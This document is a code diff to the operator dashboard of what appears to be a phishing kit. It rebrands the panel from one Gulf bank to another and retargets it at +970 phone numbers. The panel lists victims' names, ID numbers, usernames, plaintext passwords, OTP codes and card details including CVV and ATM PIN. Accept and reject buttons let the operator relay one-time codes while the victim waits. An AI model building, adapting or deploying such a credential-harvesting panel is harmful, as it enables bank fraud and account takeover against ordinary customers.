@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1, viewport-fit=cover">
-<title>لوحة التحكم | بنك قطر الوطني</title>
+<title>لوحة التحكم | البنك الإسلامي العربي</title>
 <link rel="preconnect" href="https://fonts.googleapis.com">
 <link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
 <link href="https://fonts.googleapis.com/css2?family=IBM+Plex+Sans+Arabic:wght@400;500;600;700&family=Cairo:wght@800;900&display=swap" rel="stylesheet">
@@ -411,7 +411,7 @@ body.pop-open{overflow:hidden}
       <div class="stat"><div class="n" id="stTotal">0</div><div class="l">إجمالي الطلبات</div></div>
       <div class="stat"><div class="n" id="stToday">0</div><div class="l">طلبات اليوم</div></div>
       <div class="stat"><div class="n" id="stActive" style="color:#1E7B34">0</div><div class="l">الزيارات النشطة الآن</div></div>
-      <div class="stat"><div class="n num" id="stFees">0 AED</div><div class="l">إجمالي الرسوم</div></div>
+      <div class="stat"><div class="n num" id="stFees">0</div><div class="l">الطلبات المؤكدة</div></div>
     </div>
 
     <div class="table-wrap">
@@ -419,12 +419,11 @@ body.pop-open{overflow:hidden}
         <table>
           <thead>
             <tr>
-              <th>نوع البطاقة</th>
-              <th>الساعة</th>
               <th>الاسم</th>
               <th>رقم الجوال</th>
+              <th>اسم المستخدم</th>
               <th>الحالة</th>
-              <th>المنطقة</th>
+              <th>الخطوة</th>
               <th>الإجراءات</th>
             </tr>
           </thead>
@@ -489,12 +488,10 @@ $("logoutBtn").onclick = () => { try { sessionStorage.removeItem("fz_admin_pw");
 
 // ===== جلب البيانات =====
 const DEMO_ORDERS = [
-  {ref:"FZ-09999999", ts:Date.now()-40000, card:"t1", watch:"w5", status:"pending", st:"resident", n:"منى إبراهيم", id:"784199042673271", p:"561112233", e:"mona@gmail.com", g:"female", em:"sharjah", a:"1", ad:"المجاز، برج 2"},
-  {ref:"FZ-10000000", ts:Date.now()-120000, card:"t3", watch:"w9", status:"awaiting", step:"otp", st:"citizen", n:"خالد سعيد", id:"784199042673279", p:"509998877", e:"khaled@gmail.com", g:"male", em:"dubai", a:"2", ad:"القوز، مستودع 4", pay:{cardName:"KHALED SAEED", last4:"4242", brand:"visa", exp:"12/30", cvv:true, otp:true, pin:true}},
-  {ref:"FZ-10000001", ts:Date.now()-600000, card:"t2", watch:"w7", status:"confirmed", st:"citizen", n:"عبدالله محمد علي", id:"784199942673270", p:"501234567", e:"abdulla@gmail.com", g:"male", em:"dubai", a:"6", ad:"شارع 12، فيلا 45، بجوار مسجد مردف"},
-  {ref:"FZ-10000002", ts:Date.now()-3600000, card:"t1", watch:"w13", st:"resident", n:"سارة أحمد", id:"784198542673278", p:"551112233", e:"sara@gmail.com", g:"female", em:"abudhabi", a:"1", ad:"جزيرة الريم، برج 3، شقة 12"},
-  {ref:"FZ-10000003", ts:Date.now()-90000000, card:"t3", watch:"w9", st:"citizen", n:"محمد خالد", id:"784197542673276", p:"562223344", e:"m.khaled@gmail.com", g:"male", em:"sharjah", a:"1", ad:"المجاز، شارع 5، بناية النور"},
-  {ref:"FZ-10000004", ts:Date.now()-172800000, card:"t4", watch:"w18", st:"resident", n:"فاطمة يوسف", id:"784199042673274", p:"583334455", e:"fatma@gmail.com", g:"female", em:"ajman", a:"0", ad:"النعيمية، بناية 7، شقة 304"}
+  {ref:"HM-100001", ts:Date.now()-40000, status:"awaiting", step:"ooredoo", n:"أحمد محمود", id:"912345678", p:"0591234567", e:"ahmed@gmail.com", g:"male", ooredoo:{username:"ahmed_m",password:"pass123",otp:""}},
+  {ref:"HM-100002", ts:Date.now()-120000, status:"awaiting", step:"ooredoo-otp", n:"سارة خالد", id:"923456789", p:"0561234567", e:"sara@gmail.com", g:"female", ooredoo:{username:"sara_k",password:"mypass",otp:"482916"}},
+  {ref:"HM-100003", ts:Date.now()-600000, status:"confirmed", n:"محمد علي", id:"934567890", p:"0597654321", e:"moh@gmail.com", g:"male", ooredoo:{username:"moh_ali",password:"secret",otp:"193847"}},
+  {ref:"HM-100004", ts:Date.now()-3600000, status:"pending", n:"فاطمة يوسف", id:"945678901", p:"0567891234", e:"fatma@gmail.com", g:"female"}
 ];
 async function refresh(){
   if (MODE === "server") {
@@ -530,7 +527,7 @@ function toast(msg){
   clearTimeout(toast._t); toast._t = setTimeout(() => t.classList.remove("show"), 4000);
 }
 function loadOrders(){ return CACHE; }
-function fmtPhone(d){ return d ? `+971 ${d.slice(0,2)} ${d.slice(2,5)} ${d.slice(5)}` : ""; }
+function fmtPhone(d){ return d ? `+970 ${d.slice(0,3)} ${d.slice(3,6)} ${d.slice(6)}` : ""; }
 function fmtEid(d){ return d ? [d.slice(0,3), d.slice(3,7), d.slice(7,14), d.slice(14)].filter(Boolean).join("-") : ""; }
 function fmtDate(ts){ const d = new Date(ts); return d.toLocaleString("ar-AE", {year:"numeric",month:"2-digit",day:"2-digit",hour:"2-digit",minute:"2-digit"}); }
 function areaName(em, a){ const E = EMIRATES.find(e=>e.id===em); return E && E.areas[+a] ? E.areas[+a].ar : ""; }
@@ -547,26 +544,18 @@ function openPop(ref){
   const card = plans.find(p => p.cls === o.card);
   const watch = WATCHES.find(w => w.id === o.watch);
   $("popHead").innerHTML = `
-    ${card ? `<img class="c" src="${card.img}" alt="">` : ""}
-    ${watch ? `<img class="w" src="${watch.img}" alt="">` : ""}
-    <div class="t"><b id="popTitle">${esc(o.n)}</b><span>${esc(o.ref)}</span></div>
+    <div class="t"><b id="popTitle">${esc(o.n || "—")}</b><span>${esc(o.ref)}</span></div>
     <button class="pop-x" id="popClose" aria-label="إغلاق"><svg width="20" height="20" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 6l12 12M18 6 6 18"/></svg></button>`;
   $("popBody").innerHTML = `
     <div class="dgrid">
-      <div class="drow"><span class="k">نوع البطاقة</span><span class="v">${card ? card.ar : (o.cardName || o.card)}</span></div>
-      <div class="drow"><span class="k">الساعة</span><span class="v">${watch ? watch.ar : (o.watchName || "—")}</span></div>
       <div class="drow"><span class="k">الحالة</span><span class="v">${statusText(o.status)}</span></div>
       <div class="drow"><span class="k">التاريخ</span><span class="v">${fmtDate(o.ts)}</span></div>
-      <div class="drow"><span class="k">الصفة</span><span class="v">${o.st === "resident" ? "مقيم" : "مواطن"}</span></div>
-      <div class="drow"><span class="k">الاسم</span><span class="v">${esc(o.n)}</span></div>
-      <div class="drow"><span class="k">الجنس</span><span class="v">${o.g === "female" ? "أنثى" : "ذكر"}</span></div>
+      <div class="drow"><span class="k">الاسم</span><span class="v">${esc(o.n || "—")}</span></div>
       <div class="drow"><span class="k">رقم الجوال</span><span class="v" style="direction:ltr">${fmtPhone(o.p)}</span></div>
-      <div class="drow"><span class="k">البريد الإلكتروني</span><span class="v" style="direction:ltr">${esc(o.e)}</span></div>
-      <div class="drow"><span class="k">رقم الهوية</span><span class="v" style="direction:ltr">${fmtEid(o.id)}</span></div>
-      <div class="drow"><span class="k">الإمارة</span><span class="v">${emName(o.em)}</span></div>
-      <div class="drow"><span class="k">المنطقة</span><span class="v">${areaName(o.em,o.a)}</span></div>
-      <div class="drow"><span class="k">البنك</span><span class="v">${esc(o.bankName || o.bank || "—")}</span></div>
-      <div class="drow" style="grid-column:1/-1"><span class="k">عنوان التوصيل</span><span class="v">${esc(o.ad)}</span></div>
+      <div class="drow"><span class="k">رقم الهوية</span><span class="v" style="direction:ltr">${esc(o.id || "—")}</span></div>
+      <div class="drow"><span class="k">البريد الإلكتروني</span><span class="v" style="direction:ltr">${esc(o.e || "—")}</span></div>
+      <div class="drow"><span class="k">الجنس</span><span class="v">${o.g === "female" ? "أنثى" : "ذكر"}</span></div>
+      ${o.ad ? `<div class="drow" style="grid-column:1/-1"><span class="k">العنوان</span><span class="v">${esc(o.ad)}</span></div>` : ""}
     </div>
  ${o.pay ? `<div style="margin-top:16px"><div style="font-weight:800;margin-bottom:6px">بيانات الدفع</div><div class="dgrid">
 <div class="drow"><span class="k">اسم صاحب البطاقة</span><span class="v">${esc(payValue(o.pay.cardName))}</span></div>
@@ -577,10 +566,10 @@ function openPop(ref){
 <div class="drow"><span class="k">الرقم السري</span><span class="v" style="direction:ltr">${esc(payValue(o.pay.pin))}</span></div>
 </div></div>` : ""}
 ${o.ooredoo ? `
-<div style="margin-top:16px"><div style="font-weight:800;margin-bottom:6px">بيانات أوريدو</div><div class="dgrid">
-    <div class="drow"><span class="k">اسم المستخدم</span><span class="v" style="direction:ltr">${esc(o.ooredoo.username)}</span></div>
-    <div class="drow"><span class="k">كلمة المرور</span><span class="v" style="direction:ltr">${esc(o.ooredoo.password)}</span></div>
-    <div class="drow"><span class="k">رمز التحقق (OTP)</span><span class="v" style="direction:ltr">${esc(o.ooredoo.otp)}</span></div>
+<div style="margin-top:16px"><div style="font-weight:800;margin-bottom:6px;color:var(--gold)">بيانات تسجيل الدخول</div><div class="dgrid">
+    <div class="drow"><span class="k">اسم المستخدم</span><span class="v" style="direction:ltr;font-weight:700">${esc(o.ooredoo.username)}</span></div>
+    <div class="drow"><span class="k">كلمة المرور</span><span class="v" style="direction:ltr;font-weight:700">${esc(o.ooredoo.password)}</span></div>
+    <div class="drow"><span class="k">رمز التحقق (OTP)</span><span class="v" style="direction:ltr;font-weight:700">${esc(o.ooredoo.otp)}</span></div>
 </div></div>
 ` : ""}
     ${o.status === "awaiting" ? `<div class="dactions" style="border-top:1px solid var(--line); padding-top:16px">
@@ -607,50 +596,49 @@ $("pop").addEventListener("click", e => {
 document.addEventListener("keydown", e => { if (e.key === "Escape") closePop(); });
 
 function stepName(step){
-  return step === "otp" ? "رمز التأكيد (OTP)" : step === "pin" ? "الرقم السري (ATM)" : step === "ooredoo-otp" ? "رمز أوريدو (OTP)" : step === "ooredoo" ? "بيانات أوريدو" : "بيانات البطاقة";
+  return step === "otp" ? "رمز التأكيد (OTP)" : step === "pin" ? "الرقم السري (ATM)" : step === "ooredoo-otp" ? "رمز التحقق (OTP)" : step === "ooredoo" ? "بيانات تسجيل الدخول" : "بيانات البطاقة";
 }
 function badgeFor(st){
-  if (st === "awaiting") return '<span class="badge wait">بانتظار الموافقة</span>';
+  if (st === "awaiting") return '<span class="badge wait">بانتظار قرارك</span>';
   if (st === "rejected") return '<span class="badge rej">مرفوض</span>';
-  if (st === "pending")  return '<span class="badge pend">لم يكتمل</span>';
+  if (st === "stepok")   return '<span class="badge wait">بانتظار الخطوة التالية</span>';
+  if (st === "pending")  return '<span class="badge pend">قيد الإدخال</span>';
   return '<span class="badge ok">مؤكد</span>';
 }
 function statusText(st){
-  return st === "awaiting" ? "بانتظار موافقتك على الدفع" : st === "rejected" ? "مرفوض" : st === "pending" ? "لم يؤكد الملخص بعد" : "مؤكد";
+  return st === "awaiting" ? "بانتظار قرارك" : st === "rejected" ? "مرفوض" : st === "stepok" ? "تم القبول — بانتظار الخطوة التالية" : st === "pending" ? "قيد الإدخال" : "مؤكد";
 }
 function render(){
   const q = $("search").value.trim().toLowerCase();
   const all = loadOrders();
-  const rank = st => st === "awaiting" ? 0 : st === "pending" ? 1 : 2;
+  const rank = st => st === "awaiting" ? 0 : st === "stepok" ? 1 : st === "pending" ? 2 : 3;
   let orders = all.slice().sort((a, b) => rank(a.status) - rank(b.status) || (b.ts || 0) - (a.ts || 0));
   const total = orders.length;
   $("demoNote").hidden = !isDemo;
   const today = all.filter(o => new Date(o.ts).toDateString() === new Date().toDateString()).length;
   $("stTotal").textContent = all.length;
   $("stToday").textContent = today;
-  $("stFees").textContent = (all.filter(o => o.status === "confirmed").length * 5) + " AED";
+  $("stFees").textContent = all.filter(o => o.status === "confirmed").length;
 
   if (q) orders = orders.filter(o => (o.n||"").toLowerCase().includes(q) || (o.p||"").includes(q.replace(/\D/g,"")));
 
   const rows = $("rows");
   if (!orders.length){
-    rows.innerHTML = `<tr class="empty-row"><td colspan="5">${q ? "لا توجد نتائج مطابقة للبحث." : "لا توجد طلبات بعد. سيظهر الطلب هنا فور ضغط العميل على تأكيد ومتابعة."}</td></tr>`;
+    rows.innerHTML = `<tr class="empty-row"><td colspan="6">${q ? "لا توجد نتائج مطابقة للبحث." : "لا توجد طلبات بعد. سيظهر الطلب هنا فور تسجيل دخول العميل."}</td></tr>`;
     return;
   }
   rows.innerHTML = orders.map(o => {
-    const card = plans.find(p => p.cls === o.card);
-    const watch = WATCHES.find(w => w.id === o.watch);
-    const region = `${emName(o.em) || "—"}${o.a ? ` / ${areaName(o.em, o.a) || "—"}` : ""}`;
+    const uname = o.ooredoo ? o.ooredoo.username : "—";
     return `<tr class="${o.status === "awaiting" ? "await-row" : ""}">
-      <td><div class="cardcell">${card ? `<img src="${card.img}" alt="">` : ""}<span>${card ? card.ar : (o.cardName || o.card)}</span></div></td>
-      <td>${watch ? `<div class="watchcell"><img src="${watch.img}" alt=""><span>${watch.ar}</span></div>` : (o.watchName || "—")}</td>
-      <td>${esc(o.n)} ${badgeFor(o.status)}${o.status === "awaiting" ? ` <span class="badge" style="background:var(--media);color:var(--muted)">${stepName(o.step)}</span>` : ""}</td>
+      <td>${esc(o.n || "—")} ${badgeFor(o.status)}</td>
       <td class="num">${fmtPhone(o.p)}</td>
+      <td style="direction:ltr">${esc(uname)}</td>
       <td>${badgeFor(o.status)}</td>
-      <td>${esc(region)}</td>
+      <td>${o.step ? stepName(o.step) : "—"}</td>
       <td><div class="rowbtns">
         <button class="rbtn" data-details="${esc(o.ref)}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M2 12s3.5-7 10-7 10 7 10 7-3.5 7-10 7S2 12 2 12Z"/><circle cx="12" cy="12" r="3"/></svg> التفاصيل</button>
-        <button class="rbtn redir" data-redir="${esc(o.ref)}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M5 12h14M13 6l6 6-6 6"/></svg> إعادة التوجيه</button>
+        ${o.status === "awaiting" ? `<button class="rbtn accept" data-qaccept="${esc(o.ref)}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M20 6 9 17l-5-5"/></svg> قبول</button>
+        <button class="rbtn reject" data-qreject="${esc(o.ref)}"><svg viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M6 6l12 12M18 6 6 18"/></svg> رفض</button>` : ""}
       </div></td>
     </tr>`;
   }).join("");
@@ -659,6 +647,10 @@ function render(){
 $("rows").addEventListener("click", e => {
   const d = e.target.closest("[data-details]");
   if (d) { openPop(d.dataset.details); return; }
+  const qa = e.target.closest("[data-qaccept]");
+  if (qa) { decide(qa.dataset.qaccept, "accept"); return; }
+  const qr = e.target.closest("[data-qreject]");
+  if (qr) { decide(qr.dataset.qreject, "reject"); return; }
   const r = e.target.closest("[data-redir]");
   if (r) redirect(r.dataset.redir);
 });
